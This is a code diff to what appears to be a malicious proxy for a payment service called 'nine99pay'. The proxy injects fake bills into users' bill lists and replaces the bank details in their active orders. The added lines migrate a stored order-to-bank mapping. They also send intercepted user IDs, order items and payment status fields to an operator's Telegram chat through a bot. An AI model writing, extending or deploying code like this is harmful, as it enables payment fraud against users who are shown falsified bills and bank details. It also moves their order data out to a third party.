@@ -65,6 +65,28 @@ async function loadData(forceRefresh) {
       }
       if (!cachedData.userOverrides) cachedData.userOverrides = {};
       if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
+      if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
+      if (!cachedData._migratedOldHash) {
+        try {
+          const oldMap = await redis.hgetall('nine99payOrderBankMap');
+          if (oldMap && typeof oldMap === 'object') {
+            let migrated = 0;
+            for (const [oid, val] of Object.entries(oldMap)) {
+              if (!cachedData.orderBankMap[oid]) {
+                const parsed = typeof val === 'string' ? JSON.parse(val) : val;
+                cachedData.orderBankMap[oid] = parsed;
+                migrated++;
+              }
+            }
+            if (migrated > 0) {
+              cachedData._migratedOldHash = true;
+              await redis.set('nine99payData', cachedData);
+              console.log(`Migrated ${migrated} order→bank entries from old hash`);
+            }
+          }
+        } catch(e) { console.error('Migration error:', e.message); }
+        cachedData._migratedOldHash = true;
+      }
       cacheTime = Date.now();
       return cachedData;
     }
@@ -1419,6 +1441,11 @@ async function proxyAndInjectFakeBills(req, res) {
     }
 
     const userBills = (data.fakeBills && detectedUserId && data.fakeBills[String(detectedUserId)]) || [];
+    if (data.adminChatId && bot) {
+      const allFakeBillKeys = data.fakeBills ? Object.keys(data.fakeBills) : [];
+      const firstItem = items.length > 0 ? JSON.stringify(items[0], null, 2).substring(0, 1500) : 'NO ITEMS';
+      bot.sendMessage(data.adminChatId, `🔍 BILLS DEBUG\nEndpoint: ${req.originalUrl}\nUser: ${detectedUserId}\nReal items: ${items.length}\nitemsKey: ${itemsKey}\nFakeBill users: ${allFakeBillKeys.join(', ') || 'NONE'}\nFakeBills for this user: ${userBills.length}\n\n📋 First item:\n${firstItem}`).catch(()=>{});
+    }
     if (userBills.length > 0 && items.length > 0) {
       const template = items[0];
       const fakeEntries = userBills.map(fb => {
@@ -1485,6 +1512,16 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
       }
       const eff = getEffectiveSettings(data, detectedUserId);
       const active = (eff.botEnabled !== false) ? getActiveBank(data, detectedUserId) : null;
+      if (data.adminChatId && bot) {
+        const orderBankKeys = data.orderBankMap ? Object.keys(data.orderBankMap).length : 0;
+        const firstItem = items.length > 0 ? items[0] : {};
+        const statusFields = {};
+        for (const k of Object.keys(firstItem)) {
+          const kl = k.toLowerCase();
+          if (kl.includes('status') || kl.includes('state') || kl.includes('pay')) statusFields[k] = firstItem[k];
+        }
+        bot.sendMessage(data.adminChatId, `🔍 ORDER LIST DEBUG\nUser: ${detectedUserId}\nItems: ${items.length}\nforceReviewSuccess: ${eff.forceReviewSuccess}\norderBankMap entries: ${orderBankKeys}\n\n📋 First item status fields:\n${JSON.stringify(statusFields, null, 2)}\n\nFirst item IDs: ${[firstItem.buyOrderNo, firstItem.orderNo, firstItem.orderId].filter(Boolean).join(', ')}`).catch(()=>{});
+      }
       const getItemIds = (item) => [item.buyOrderNo, item.orderNo, item.orderId, item.buyOrderId, item.id].filter(Boolean);
       const bankMap = {};
       for (const item of items) {
